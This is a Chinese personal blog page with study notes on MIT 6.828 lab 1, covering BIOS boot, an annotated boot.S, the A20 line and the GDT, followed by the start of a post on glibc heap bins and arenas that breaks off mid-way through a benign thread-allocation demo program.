    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/09/xv61/" class="post-title-link" itemprop="url">xv61</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-09 16:57:38" itemprop="dateCreated datePublished" datetime="2021-10-09T16:57:38+08:00">2021-10-09</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-31 18:22:34" itemprop="dateModified" datetime="2021-10-31T18:22:34+08:00">2021-10-31</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="MIT-6-828-lab1"><a href="#MIT-6-828-lab1" class="headerlink" title="MIT-6.828-lab1"></a>MIT-6.828-lab1</h1><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><p>环境：</p>
<blockquote>
<p>ubuntu16.04 i386</p>
</blockquote>
<p>安装qemu：</p>
<blockquote>
<p>sudo apt-get install qemu</p>
</blockquote>
<p>把实验文件下载下来：</p>
<blockquote>
<p>git clone  <a target="_blank" rel="noopener" href="https://github.com/fatsheepzzq/6.828mit.git">https://github.com/fatsheepzzq/6.828mit.git</a> </p>
</blockquote>
<p>进入lab目录：</p>
<blockquote>
<p>make</p>
<p>make qemu</p>
</blockquote>
<p>这里就已经完成在ubuntu上仿真x86计算机，并且运行xv6操作系统内核了。</p>
<p>调试：</p>
<blockquote>
<p>gdb</p>
<p>qemu</p>
</blockquote>
<p>进入lab目录下，</p>
<blockquote>
<p>make qemu gdb</p>
</blockquote>
<p>根据提示再次输入 </p>
<blockquote>
<p>make gdb</p>
</blockquote>
<p><img src="https://i.imgur.com/6WxkAOV.png"></p>
<p>就能进入gdb调试。</p>
<p>gdb可以换成pwndbg，不过现在重新装pwndbg会有一点小问题，需要重新安装新版pip版本，然后用python3去执行安装。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vage__table/article/details/120530909">https://blog.csdn.net/vage__table/article/details/120530909</a></p>
<p>wget <a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/%7B%E7%89%88%E6%9C%AC%7D/get-pip.py">https://bootstrap.pypa.io/{版本}/get-pip.py</a></p>
<p>wget <a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/3.5/get-pip.py">https://bootstrap.pypa.io/3.5/get-pip.py</a></p>
<p>python3 get-pip.py</p>
</blockquote>
<p><img src="https://i.imgur.com/YIomFo4.png"></p>
<p>重要的是这几句：</p>
<p><img src="https://i.imgur.com/gkqvqHQ.png"></p>
<p>[f000:fff0]  0xffff0:jmp  0xf000:0xe05b</p>
<p>这一指令就是整个pc启动后执行BIOS的第一条指令,其物理位置在0x000ffff0，IBM PC从这个地址开始执行，该物理地址位于ROM BIOS保留的64KB区域的顶部。</p>
<p>第一条指令就是一个跳转指令，跳转到0xfe05b这个地址。</p>
<blockquote>
<p>当pc机启动的时候，cpu运行在实模式下，但是当进入操作系统内核的时候将会运行在保护模式下。实模式是早期cpu的工作模式，这类处理器只有20根地址线，所以只能访问1mb的内存空间，但是随着cpu的不断发展，现代cpu已经具备32根地址总线，能够访问4GB内存空间，为了使用管理这4GB大的空间，保护模式随之出现。</p>
<p>实模式–&gt;保护模式</p>
<p>现代处理器都是工作在保护模式下的，为了实现向后兼容，所以都是启动时运行于实模式，启动完成后运行于保护模式。</p>
<p>BIOS是PC机刚启动时运行的软件，所以它必然处于实模式。</p>
</blockquote>
<p>实模式下，指令中出现的地址都是采用：</p>
<p>（段基址：段内偏移）</p>
<p>这两个字段通常都存放在寄存器中。</p>
<blockquote>
<p>段基址必须放在段寄存器中（cs、ds、ss、es），不同段寄存器存放的时程序不同的段的起始地址。</p>
</blockquote>
<p>如何得到0xfe05b这个地址的？</p>
<blockquote>
<p>之前的cpu寄存器都是16位的，现在的cpu是20位的，于是把段基址左移4位，形成20位的地址，加上段内偏移，构成真实地址。</p>
<p>0xf0000+0xe05b=0xfe05b</p>
</blockquote>
<p>BIOS流程：</p>
<p><img src="https://i.imgur.com/WIKqAmW.png"></p>
<p><img src="https://i.imgur.com/ZhfVWR8.png"></p>
<blockquote>
<p>到这里jmp，通过一个跳转进入保护模式，实模式结束。</p>
</blockquote>
<h2 id="part-1"><a href="#part-1" class="headerlink" title="part 1:"></a>part 1:</h2><p>​    当BIOS运行的时候它初始化、检测了各种底层设备，比如GDTR寄存器，设置中断向量表，作为PC启动后的第一段程序，最重要的功能是<strong>把操作系统从磁盘中导入内存，再把控制权转交给操作系统。</strong></p>
<p>​    上电自检后，会去读取启动设备的 0磁道 1扇区 上面的前512字节（MBR）的数据。这就是我们常说的启动扇区(boot sector)，BIOS会看最后两个字节是不是<strong>55 AA</strong>，如果是就用一条jmp指令跳过去就是了。</p>
<blockquote>
<p>POST（Power On Self Test，自检）程序将检查各个硬件设备是否工作正常，自检包括对CPU、640kB基本内存、1MB以上的扩展内存、ROM、主板、CMOS存储器、串并口、显示卡、软/硬盘子系统及键盘的测试，一旦在自检过程中发现问题，系统将给出提示信息或警告。</p>
</blockquote>
<p>​    所以BIOS会在运行的最后检测可以从当前系统的哪个设备中找到操作系统，一般来说是我们的磁盘，或者u盘。</p>
<p>​    当BIOS确定了，假如说操作系统位于磁盘，那么它就会把这个磁盘的第一个扇区，通常把它叫做启动区（boot sector）先加载到内存中。这个启动区有个很重要的程序：<strong>boot loader</strong></p>
<blockquote>
<p>boot loader负责把整个操作系统从磁盘导入到内存的工作。</p>
<p>以及一些非常重要的配置工作。</p>
<p>最后操作系统才会开始运行。</p>
</blockquote>
<p>​    其PC启动后的运行顺序：<strong>BIOS—&gt;boot loader—&gt;操作系统内核</strong></p>
<blockquote>
<p>Q:没发现检测55AA的代码</p>
</blockquote>
<h2 id="part-2"><a href="#part-2" class="headerlink" title="part 2:"></a>part 2:</h2><p>​    对于PC来说，软盘、硬盘都可以被划分成512字节的区域，称作扇区。</p>
<p>​    一个扇区是一次磁盘操作的最小粒度。</p>
<p>​    第一个扇区叫做启动扇区。当BIOS找到这个boot loader的时候，就会把这个512字节加载到内存地址0x7c00~0x7dff这个区域内。</p>
<blockquote>
<p>Q：如何跳转的？</p>
</blockquote>
<blockquote>
<p>意味着boot loader程序的大小小于等于512字节</p>
</blockquote>
<p>​    整个boot loader是由一个汇编文件，boot/boot.s以及一个c语言文件，boot/main.c构成。</p>
<blockquote>
<p>boot目录下boot.s+main.c</p>
<p>boot loader=boot.s+main.c</p>
</blockquote>
<p>​    引导程序两个功能：</p>
<p>1.将实模式切换到保护模式，只有在保护模式下，软件才能访问处理器物理地址空间中超过1MB的所有内存。</p>
<p>2.引导加载程序通过x86的特殊io指令直接访问IDE磁盘设备寄存器，从硬盘读取内核。</p>
<p>boot的过程使用了这两个文件，因为要在最初的时候经历实模式到特权模式的抓换，16bit到32bit的转换，所以最开始的步骤是在汇编文件内部完成初始化的（boot.s）之后切换到32bit，最后进入main函数内部开启bootloader程序。</p>
<blockquote>
<p>cpu可以读取3个地方的数据：cpu内部寄存器、内存单元、端口（in out）</p>
</blockquote>
<h4 id="分析两个文件"><a href="#分析两个文件" class="headerlink" title="分析两个文件"></a>分析两个文件</h4><h5 id="boot-s"><a href="#boot-s" class="headerlink" title="boot.s"></a>boot.s</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;inc&#x2F;mmu.h&gt;</span><br><span class="line"></span><br><span class="line"># Start the CPU: switch to 32-bit protected mode, jump into C.</span><br><span class="line"># The BIOS loads this code from the first sector of the hard disk into</span><br><span class="line"># memory at physical address 0x7c00 and starts executing in real mode</span><br><span class="line"># with %cs&#x3D;0 %ip&#x3D;7c00.</span><br><span class="line"></span><br><span class="line">.set PROT_MODE_CSEG, 0x8         # kernel code segment selector</span><br><span class="line">.set PROT_MODE_DSEG, 0x10        # kernel data segment selector</span><br><span class="line">.set CR0_PE_ON,      0x1         # protected mode enable flag</span><br><span class="line">-----------------------------------------------------------------------------------------|</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">  .code16                     # Assemble for 16-bit mode</span><br><span class="line">  cli                         # Disable interrupts</span><br><span class="line">  cld                         # String operations increment</span><br><span class="line">  这几句是boot.s的开始，cli是boot.s的第一条指令，功能是把所有中断都关闭，因为在bios运行期间可能打开了中断。此时cpu工作在实模式下。</span><br><span class="line">  cld用于指定之后发生的串处理操作的指针移动方向。</span><br><span class="line">-----------------------------------------------------------------------------------------|</span><br><span class="line">  # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">  xorw    %ax,%ax             # Segment number zero</span><br><span class="line">  movw    %ax,%ds             # -&gt; Data Segment</span><br><span class="line">  movw    %ax,%es             # -&gt; Extra Segment</span><br><span class="line">  movw    %ax,%ss             # -&gt; Stack Segment</span><br><span class="line">  把ds\es\ss寄存器清0，bios期间运行可能对这几个寄存器操作，因此置0.</span><br><span class="line">-----------------------------------------------------------------------------------------|</span><br><span class="line">  # Enable A20:</span><br><span class="line">  #   For backwards compatibility with the earliest PCs, physical</span><br><span class="line">  #   address line 20 is tied low, so that addresses higher than</span><br><span class="line">  #   1MB wrap around to zero by default.  This code undoes this.</span><br><span class="line">seta20.1:</span><br><span class="line">1  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">2  testb   $0x2,%al</span><br><span class="line">3  jnz     seta20.1</span><br><span class="line"></span><br><span class="line">4  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</span><br><span class="line">5  outb    %al,$0x64</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">6  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">7  testb   $0x2,%al          #0000010   </span><br><span class="line">8  jnz     seta20.2</span><br><span class="line"></span><br><span class="line">9  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</span><br><span class="line">10  outb    %al,$0x60</span><br><span class="line">  </span><br><span class="line">  inb、outb这样的IO端命令，都是在对外部设备进行操作，i804x键盘控制器，这种控制器上面有4个寄存器，状态寄存器、输出缓冲器、输入缓冲器、控制寄存器。使用两个IO端口0x60   0x64.</span><br><span class="line">  驱动中把 0x60 叫数据端口</span><br><span class="line">  驱动中把 0x64 叫命令端口</span><br><span class="line"></span><br><span class="line">1~10 让A20总线启动。</span><br><span class="line"></span><br><span class="line">  https:&#x2F;&#x2F;bochs.sourceforge.io&#x2F;techspec&#x2F;PORTS.LST</span><br><span class="line">-------------------------------------------------------------------------------------------|</span><br><span class="line">  # Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line">  # and segment translation that makes virtual addresses </span><br><span class="line">  # identical to their physical addresses, so that the </span><br><span class="line">  # effective memory map does not change during the switch.</span><br><span class="line">  lgdt    gdtdesc</span><br><span class="line">  movl    %cr0, %eax</span><br><span class="line">  orl     $CR0_PE_ON, %eax</span><br><span class="line">  movl    %eax, %cr0</span><br><span class="line"></span><br><span class="line">lgdt gdtdesc，把gdtdesc这个标识符的值送入全局映射表符寄存器GDTR中。这个GDT表是处理器工作于保护模式下一个非常重要的表。这条指令把这个表的内容（重要信息）存放到CPU的gdtr寄存器中，其中包括GDT表的内存起始地址，以及GDT表的长度。这个寄存器一共有48位，其中低16位表示该表长度，高32位表是该表在内存中的起始地址。</span><br><span class="line">在末尾有gdtdesc||</span><br><span class="line"></span><br><span class="line">movl  </span><br><span class="line">-------------------------------------------------------------------------------------</span><br><span class="line">  # Jump to next instruction, but in 32-bit code segment.</span><br><span class="line">  # Switches processor into 32-bit mode.</span><br><span class="line">  ljmp    $PROT_MODE_CSEG, $protcseg</span><br><span class="line"></span><br><span class="line">  .code32                     # Assemble for 32-bit mode</span><br><span class="line">protcseg:</span><br><span class="line">  # Set up the protected-mode data segment registers</span><br><span class="line">  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector</span><br><span class="line">  movw    %ax, %ds                # -&gt; DS: Data Segment</span><br><span class="line">  movw    %ax, %es                # -&gt; ES: Extra Segment</span><br><span class="line">  movw    %ax, %fs                # -&gt; FS</span><br><span class="line">  movw    %ax, %gs                # -&gt; GS</span><br><span class="line">  movw    %ax, %ss                # -&gt; SS: Stack Segment</span><br><span class="line">  </span><br><span class="line">  # Set up the stack pointer and call into C.</span><br><span class="line">  movl    $start, %esp</span><br><span class="line">  call bootmain</span><br><span class="line"></span><br><span class="line">  # If bootmain returns (it shouldn&#39;t), loop.</span><br><span class="line">spin:</span><br><span class="line">  jmp spin</span><br><span class="line"></span><br><span class="line">1 # Bootstrap GDT</span><br><span class="line">2 .p2align 2                                # force 4 byte alignment</span><br><span class="line">3 gdt:</span><br><span class="line">4  SEG_NULL				# null seg</span><br><span class="line">5  SEG(STA_X|STA_R, 0x0, 0xffffffff)	# code seg</span><br><span class="line">6  SEG(STA_W, 0x0, 0xffffffff)	        # data seg</span><br><span class="line"></span><br><span class="line">7 gdtdesc:</span><br><span class="line">8  .word   0x17                            # sizeof(gdt) - 1</span><br><span class="line">9  .long   gdt                             # address gdt</span><br><span class="line">  </span><br><span class="line">  从第三行开始时gdt表内容，包括三个端，null seg\code seg\data seg 由于xv6并没有使用分段机制、也就是说数据和代码都是写在一起的，所以数据段和代码段的起始地址都是0x0，大小都是0xffffffff&#x3D;4GB。</span><br><span class="line">  seg子函数定义在mmu.h中。</span><br><span class="line">  </span><br><span class="line">  Q:再查查GDT的作用</span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一代的的PC机基于16位英特尔8088处理器，只能处理1MB的物理内存。因此早期PC的物理地址空间将以0x00000000开始，但以0x000fffff结束,而不是0xffffff.被标记位”低内存“的640kb区域是早期PC唯一可以使用的内存随机存取存储器。实际上早期的PC只能配置16KB\32KB\64KB的内存。</p>
</blockquote>
<p>Q:为什么是804x?</p>
<p><img src="https://i.imgur.com/uSVcn1h.png"></p>
<p>0x2==00000010</p>
<p>1~3：将al与00000010 test，在不断查看输入缓冲区是否满了，也就是cpu传送给控制器的数据，控制器是否已经取走了。因为如果cpu想向控制器传送新的数据，必须先把整这一位，也就是缓冲区为0.</p>
<p>4~5：当缓冲区准备好，将0xd1这条数据写入到0x64端口中。当向0x64端口写入数据，则代表向键盘控制器804x发送指令。这个指令将会被送给0x60端口。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012640985/article/details/24413445">https://blog.csdn.net/u012640985/article/details/24413445</a>  intel 8042键盘控制器详细介绍</p>
<blockquote>
<p>d1h:<br>准备写Output端口。随后通过60h端口写入的字节，会被放置在Output Port中。</p>
<p>D1指令代表下一次写入0x60端口的数据将被写入给804x控制器的输出端口。可以理解为下一个写入0x60端口的数据是一个控制指令。</p>
</blockquote>
<p><img src="https://i.imgur.com/KbC1InE.png"></p>
<p>6~8继续探测缓冲区是否可用，9 ~  10将会向控制器输入新的指令0xdf,根据图中给出的解释，使A20地址线可用，代表可以进入保护模式了。</p>
<blockquote>
<p><strong>A20总线</strong>，是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/X86">x86</a>体系的扩充电子线路之一。A20总线是专门用来转换<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%9D%80%E7%B8%BD%E7%B7%9A">地址总线</a>的第二十一位。</p>
<p>在8088及8086下，任何使用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/X86%E5%86%85%E5%AD%98%E5%88%86%E6%AE%B5">x86内存分段</a>方式尝试访问超过最大1MB的内存都会使得溢出的第二十一位无效化。 许多<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AE%9E%E6%A8%A1%E5%BC%8F">实模式</a>程序利用这一点，使不改变微处理器的段寄存器而去访问最开始的64KB内存成为一个通用的技巧。为了和这些程序保持兼容性，IBM自己在<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%B8%BB%E6%9D%BF">主板</a>上去修复这个问题。在微处理器与<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E6%80%BB%E7%BA%BF">系统总线</a>间插入一个逻辑门完成了这个修复。这个逻辑门也因此被命名为A20总线。A20总线能被<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a>关闭或打开，以此来阻止或允许地址总线收到A20传来的信号。在引导系统时，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/BIOS">BIOS</a>先打开A20总线来统计和测试所有的系统内存。而当BIOS准备将计算机的控制权交给操作系统时会先将A20总线关闭。一开始，这个<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%80%BB%E8%BE%91%E9%97%A8">逻辑门</a>连接到<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=Intel_8042&action=edit&redlink=1">Intel 8042</a>的键盘控制器。控制它是相对较慢。</p>
<p>激活A20总线是启动操作系统的步骤之一，通常在启动程序将控制权交给内核之前完成。</p>
<p>所以启用A20是为了让20位后有效。</p>
</blockquote>
<p><img src="https://i.imgur.com/6jjHVQh.png"></p>
<p><img src="https://i.imgur.com/TcPlytb.png"></p>
<p>这384kb被硬件保留用于特殊用途，如视频显示缓冲区和固件保存在非挥发性记忆体中。</p>
<p><img src="https://i.imgur.com/wWBWsqA.png"></p>
<p>这1MB都是保留部分。最重要的还是BIOS ROM（基本输入输出系统）它占据了物理内存的64KB，早期的PC中，BIOS保存在只读存储器（ROM）中，但是现在的个人电脑将BIOS存储在可更新的快闪存储器中。</p>
<blockquote>
<p>物理内存的构成：随机存储器、只读存储器、可更新的快闪存储器</p>
</blockquote>
<p>当 Intel 最终用80286和80386处理器打破了1兆字节的屏障，这两个处理器分别支持16mb 和4gb 的物理地址空间，个人电脑架构师仍然保留了最初的1mb 物理地址空间的布局，以确保现有软件的向下兼容。因此，现代 pc 在0x000A0000到0x00100000之间的物理内存上有一个“漏洞”，将内存分为“低”或“常规内存”(前640KB)和“扩展内存”(其他所有内存)。此外，在 PC 的32位物理地址空间的最顶端(首先是物理 RAM)的一些空间现在通常由 BIOS 保留，供32位 PCI 设备使用。</p>
<blockquote>
<p>PCI 设备是直接插入计算机主板上的 PCI 插槽的任何计算机硬件。</p>
</blockquote>
<p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fatsheep9146/category/769143.html">https://www.cnblogs.com/fatsheep9146/category/769143.html</a> 详细1-3</p>
<p><a target="_blank" rel="noopener" href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/">https://pdos.csail.mit.edu/6.828/2018/labs/lab1/</a>  mit官方lab1文档</p>
<h2 id="os"><a href="#os" class="headerlink" title="os"></a>os</h2><p>bochs环境配置</p>
<p><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/bochs/files/bochs/2.7/">https://sourceforge.net/projects/bochs/files/bochs/2.7/</a></p>
<p>源码下载</p>
<p>安装教程：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lfri/p/11489223.html">https://www.cnblogs.com/lfri/p/11489223.html</a></p>
<p>解决错误：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_35984320/article/details/89452471">https://blog.csdn.net/sinat_35984320/article/details/89452471</a></p>
<p><img src="https://i.imgur.com/KtmrxBz.png"></p>
<p>fuzz      ctf    基础知识labs   iot   </p>
<p>挖洞、做关于iot安全的产品    </p>
<p>导入</p>
<p>bochs -f bochsrc</p>
<p>编译 MBR文件： nasm -o mbr.bin mbr.S</p>
<p>将bin文件复制到bochs的目录下，执行：dd if=mbr.bin of=a.img bs=512 count=1 conv=notrunc</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/09/09/how2heap-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/09/how2heap-learn/" class="post-title-link" itemprop="url">how2heap_learn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-09 20:09:02" itemprop="dateCreated datePublished" datetime="2021-09-09T20:09:02+08:00">2021-09-09</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-24 20:27:23" itemprop="dateModified" datetime="2021-10-24T20:27:23+08:00">2021-10-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="glibc堆分配策略"><a href="#glibc堆分配策略" class="headerlink" title="glibc堆分配策略"></a>glibc堆分配策略</h1><p>malloc的时候不会是你申请多大就分配多大，第一次申请首先划分一大块内存，频繁向操作系统申请内存耗费时间。</p>
<p>随后切下一小部分返回给用户，多次分配释放以后，维护这些不断变动、切割的内存块比较困难，所以添加多个缓冲池（bin）来管理这些释放的小内存块，在下次用户请求内存块的时候首先在bin中查找。</p>
<h2 id="glibc2-31维护以下bins"><a href="#glibc2-31维护以下bins" class="headerlink" title="glibc2.31维护以下bins"></a>glibc2.31维护以下bins</h2><p>tcache bin 2.26以后新加g入的内容，最大0x400 优先分配过来，优先查找。</p>
<p>fast bin</p>
<p>unsorted bin</p>
<p>small bin</p>
<p>large bin</p>
<hr>
<p>堆块结构</p>
<p>​                                  – - -</p>
<p>​                                  头部</p>
<p>返回给用户的指针–》– - -</p>
<p>​                                 数据</p>
<p>​                                   —-</p>
<p>头部包含前一个（物理相邻）chunk的大小，本chunk（包含头部0x10字节，64位，0x8，32位）的大小</p>
<p>以及两个特殊的chunk（堆块）:</p>
<p>这两个chunk是直接由arena进行管理的。</p>
<p>top chunk：用于在任何bin中都找不到合适的堆块进行分配时，划分的堆块，如果这个堆块也不够，则会分配一个更大的top chunk进行切割，原先的top chunk会变成free的堆块被挂在适当的bin中。</p>
<p>last remainder chunk：当发生堆块的切割时，记录最近一次切割剩下的堆块，如 释放了0x1000的堆块，随后又分配了0x500,glibc会为剩下的0xa00构造成一个被释放的堆块，last remainder指针将会指向这个堆块。</p>
<p>ptmalloc2引入了arenas的概念，每个竞技场本质上是一个完全不同的堆，它完全管理自己的chunk allocation和free bins。主函数有个arenas是主竞技场，线程也有别的arenas。AMP后三位中的A就是表明当前的chunk是否由主arenas分配，0是1不是。</p>
<p>线程运行的本质其实就是函数执行。由于线程运行的本质就是函数运行，函数运行时信息是保存在栈帧中的，因此 <strong>每个线程都有自己独立的、私有的栈区。</strong>线程共享进程的资源，也有自己的私有资源，</p>
<blockquote>
<p>私有资源：所属线程的栈区、程序计数器、栈指针、运行时使用的寄存器</p>
<p>共享资源：代码区、数据区、堆区</p>
</blockquote>
<p>arena的实现：</p>
<p>arena管理各个堆，里面包含mutex、flags、fastbin指针、topchunk指针、last reminder、bins（存储unsorted bin，small bins、large bins的chunk链表）、binmap用一个bit来标识某一个bin中是否包含空闲chunk。</p>
<p>主线程 main arena /其他线程 thread arena</p>
<p>一个<em>进程</em>至少有一个<em>线程</em>，这个<em>线程</em>是主<em>线程</em>！,每个进程都有在入口分配一个堆区，然后top chunk 然后切割top chunk</p>
<p>如果有线程则像b7604000这块堆区一样，另外开辟</p>
<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20210911200016709.png" alt="image-20210911200016709"></p>
<p>线程堆分配与回收</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//编译选项 gcc -g heap.c -lpthread -m32 -o heap </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc 